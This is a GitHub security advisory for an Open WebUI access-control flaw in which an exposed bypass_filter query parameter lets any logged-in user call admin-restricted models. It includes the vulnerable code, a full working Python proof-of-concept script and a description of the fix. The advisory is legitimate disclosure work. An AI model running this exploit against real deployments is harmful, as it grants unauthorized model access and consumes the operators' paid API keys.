# [M] Open WebUI: Authenticated users can bypass model access control via exposed query parameter [AI-ASSISTED]

## Summary
Severity: Medium
Advisory: GHSA-v6qf-75pr-p96m
CVE: CVE-2026-45365
CWE: CWE-285
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-v6qf-75pr-p96m
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.8.11

## Details
### Summary

An internal-only bypass_filter parameter is exposed on the /openai/chat/completions and /ollama/api/chat HTTP endpoints via FastAPI query string binding, allowing any authenticated user to append ?bypass_filter=true and bypass model access control checks to invoke admin-restricted models.

### Details

The `generate_chat_completion` route handlers in both `routers/openai.py` and `routers/ollama.py` declare `bypass_filter` as a function parameter:

**`routers/openai.py`, line 937–941:**

```python
@router.post("/chat/completions")
async def generate_chat_completion(
    request: Request,
    form_data: dict,
    user=Depends(get_verified_user),
    bypass_filter: Optional[bool] = False,
    ...
):
```

**`routers/ollama.py`, line 1283–1288:**

```python
@router.post("/api/chat")
async def generate_chat_completion(
    ...
    bypass_filter: Optional[bool] = False,
    ...
):
```

Because FastAPI automatically binds unrecognized function parameters to the query string, any HTTP client can set this value by appending `?bypass_filter=true` to the request URL.

When `bypass_filter` is true, the access control check is skipped entirely:

**`routers/openai.py`, line 980:**

```python
if not bypass_filter and user.role == "user":
    # ACL check — skipped when bypass_filter is True
```

This parameter is intended for internal use only — the server-side chat pipeline in `utils/chat.py` (lines 238, 253) passes `bypass_filter=True` as a Python function argument when making recursive calls to base models that have already been authorized. However, because it appears in the HTTP handler's signature, it is unintentionally exposed to external callers.

This is separate from the `BYPASS_MODEL_ACCESS_CONTROL` environment variable, which is a deliberate admin setting for trusted environments.


### PoC

```python
#!/usr/bin/env python3
"""
uv run --no-project --with requests finding_02_bypass_filter_acl_bypass.py [--base-url http://localhost:8089]

Finding #2 — Unauthorized model access via bypass_filter query parameter

SUMMARY:
  The POST /openai/chat/completions and POST /ollama/api/chat endpoints expose
  a bypass_filter query parameter as part of their FastAPI function signatures.
  FastAPI automatically binds this to the query string. When an authenticated
  user appends ?bypass_filter=true, the access control check is skipped:

    if not bypass_filter and user.role == "user":
        check_model_access(user, model)  # <-- skipped when bypass_filter=True

  This allows any authenticated user to invoke models they are not authorized
  to use, including admin-restricted models.

VULNERABLE CODE:
  backend/open_webui/routers/openai.py, line 941 + 980:
    async def generate_chat_completion(..., bypass_filter: Optional[bool] = False, ...):
        ...
        if not bypass_filter and user.role == "user":
            # ACL check — skipped when bypass_filter=True

  backend/open_webui/routers/ollama.py, line 1288 + 1339:
    async def generate_chat_completion(..., bypass_filter: Optional[bool] = False, ...):
        ...
        if not bypass_filter and user.role == "user":
            # ACL check — skipped when bypass_filter=True

IMPACT:
  Any authenticated user can bypass model access control on both OpenAI and
  Ollama proxy endpoints. Because bypass_filter skips the ACL check but still
  routes through the server-side LLM connection, the attacker can invoke
  admin-restricted models using the server's API keys and receive actual LLM
  responses — effectively gaining free, unauthorized access to any configured
  model.

REPRODUCTION:
  1. Create a restricted model with empty access_grants (admin-only).
  2. Authenticate as a regular user.
  3. POST /openai/chat/completions with the restricted model → expect 403.
  4. POST /openai/chat/completions?bypass_filter=true → request succeeds.

REQUIREMENTS:
  - Running Open WebUI instance with Ollama or OpenAI backend configured
  - A model with restricted access_grants
  - An authenticated user who is NOT granted access to that model
"""

import argparse
import sys
import requests


def main():
    parser = argparse.ArgumentParser(description="Finding #2: bypass_filter ACL bypass")
    parser.add_argument("--base-url", required=True, help="Open WebUI base URL")
    parser.add_argument("--attacker-email", required=True)
    parser.add_argument("--attacker-password", required=True)
    parser.add_argument("--admin-email", required=True)
    parser.add_argument("--admin-password", required=True)
    args = parser.parse_args()

    base = args.base_url.rstrip("/")

    # ── Step 1: Authenticate ──
    print("[*] Authenticating as attacker...")
    r = requests.post(f"{base}/api/v1/auths/signin",
                      json={"email": args.attacker_email, "password": args.attacker_password})
    if not r.ok:
        print(f"[-] Login failed: {r.status_code}")
        sys.exit(1)
    attacker_token = r.json()["token"]
    print(f"[+] Logged in as attacker (id={r.json()['id']})")

    # ── Step 2: Find restricted model via admin ──
    print("[*] Authenticating as admin to find restricted model...")
    r = requests.post(f"{base}/api/v1/auths/signin",
                      json={"email": args.admin_email, "password": args.admin_password})
    if not r.ok:
        print(f"[-] Admin login failed: {r.status_code}")
        sys.exit(1)
    admin_token = r.json()["token"]

    r = requests.get(f"{base}/api/v1/models", headers={"Authorization": f"Bearer {admin_token}"})
    if not r.ok:
        print(f"[-] Failed to list models: {r.status_code}")
        sys.exit(1)

    models = r.json()
    if isinstance(models, dict):
        models = models.get("data", models.get("models", []))

    restricted_model_id = None
    base_model_id = None
    for m in models:
        info = m.get("info", {})
        if not info:
            continue
        access_grants = info.get("access_grants", None)
        if access_grants is not None and len(access_grants) == 0 and info.get("base_model_id"):
            restricted_model_id = m["id"]
            base_model_id = info.get("base_model_id")
            print(f"[+] Found restricted model: {restricted_model_id} (base: {base_model_id})")
            break

    if not restricted_model_id:
        print("[-] No restricted model found.")
        sys.exit(1)

    headers = {"Authorization": f"Bearer {attacker_token}"}
    payload = {
        "model": restricted_model_id,
        "messages": [{"role": "user", "content": "Say exactly: BYPASS_CONFIRMED"}],
        "stream": False,
    }

    # ── Step 3: Confirm access is denied on /openai/chat/completions ──
    print(f"\n[*] Step 1: POST /openai/chat/completions (no bypass) with model '{restricted_model_id}'...")
    r = requests.post(f"{base}/openai/chat/completions", headers=headers, json=payload)
    print(f"    Response: {r.status_code} {r.text[:200]}")

    if r.status_code == 403:
        print("[+] Access correctly DENIED (403) — attacker cannot use the restricted model")
    else:
        print(f"[!] Unexpected response code {r.status_code} (expected 403)")

    # ── Step 4: Bypass with ?bypass_filter=true on OpenAI endpoint ──
    print(f"\n[*] Step 2: POST /openai/chat/completions?bypass_filter=true ...")
    r = requests.post(f"{base}/openai/chat/completions",
                      headers=headers, json=payload,
                      params={"bypass_filter": "true"})
    print(f"    Response: {r.status_code} {r.text[:300]}")

    openai_bypassed = r.status_code != 403

    if openai_bypassed:
        print(f"[+] OpenAI endpoint: ACL BYPASSED (got {r.status_code} instead of 403)")
    else:
        print(f"[-] OpenAI endpoint: bypass did not work (still 403)")

    # ── Step 5: Also test Ollama endpoint ──
    print(f"\n[*] Step 3: POST /ollama/api/chat?bypass_filter=true ...")
    ollama_payload = {
        "model": restricted_model_id,
        "messages": [{"role": "user", "content": "Say exactly: BYPASS_CONFIRMED"}],
        "stream": False,
    }
    r_normal = requests.post(f"{base}/ollama/api/chat", headers=headers, json=ollama_payload)
    print(f"    Without bypass: {r_normal.status_code} {r_normal.text[:150]}")

    r_bypass = requests.post(f"{base}/ollama/api/chat", headers=headers, json=ollama_payload,
                             params={"bypass_filter": "true"})
    print(f"    With bypass:    {r_bypass.status_code} {r_bypass.text[:150]}")

    ollama_bypassed = r_normal.status_code == 403 and r_bypass.status_code != 403

    if ollama_bypassed:
        print(f"[+] Ollama endpoint: ACL BYPASSED ({r_normal.status_code} → {r_bypass.status_code})")
    elif r_bypass.status_code != 403:
        print(f"[+] Ollama endpoint: bypass_filter accepted (status {r_bypass.status_code})")
        ollama_bypassed = True
    else:
        print(f"[-] Ollama endpoint: bypass did not work")

    # ── Results ──
    if openai_bypassed or ollama_bypassed:
        print(f"\n[+] SUCCESS: bypass_filter query parameter bypasses model access control!")
        print(f"    OpenAI endpoint (/openai/chat/completions): {'BYPASSED' if openai_bypassed else 'not bypassed'}")
        print(f"    Ollama endpoint (/ollama/api/chat):          {'BYPASSED' if ollama_bypassed else 'not bypassed'}")
        print(f"")
        print(f"    Any authenticated user can append ?bypass_filter=true to skip")
        print(f"    check_model_access() and use admin-restricted models via the")
        print(f"    server's own API keys.")
        sys.exit(0)
    else:
        print(f"\n[-] FAILED: bypass_filter did not bypass access control on either endpoint")
        sys.exit(1)


if __name__ == "__main__":
    main()
```


### Impact

Any authenticated user (including those with the lowest "user" role) can invoke any model configured on the server, regardless of access control settings. This bypasses the admin's ability to restrict which models are available to which users — for example, limiting expensive models to specific teams or keeping certain models internal-only.


## Resolution

Fixed in commit [c0385f60b](https://github.com/open-webui/open-webui/commit/c0385f60ba049da48d2d5452068586d375303c37), first released in **v0.8.11** (Mar 2026) — one day after this report.

`bypass_filter` is no longer a function parameter on either route handler. Both `routers/openai.py` and `routers/ollama.py` now read it via `getattr(request.state, 'bypass_filter', False)`. Because `request.state` can only be populated by server-side code in the same process (typically `utils/chat.py` when recursing into a base model the caller is already authorized for), external HTTP clients cannot set it via query string, body, or any other transport-level mechanism. Appending `?bypass_filter=true` to the URL has no effect — the query parameter is now silently ignored by FastAPI since it doesn't bind to any handler argument.

Users on `>= 0.8.11` are not affected.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-v6qf-75pr-p96m
- https://nvd.nist.gov/vuln/detail/CVE-2026-45365
- https://github.com/open-webui/open-webui/commit/c0385f60ba049da48d2d5452068586d375303c37
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.8.11
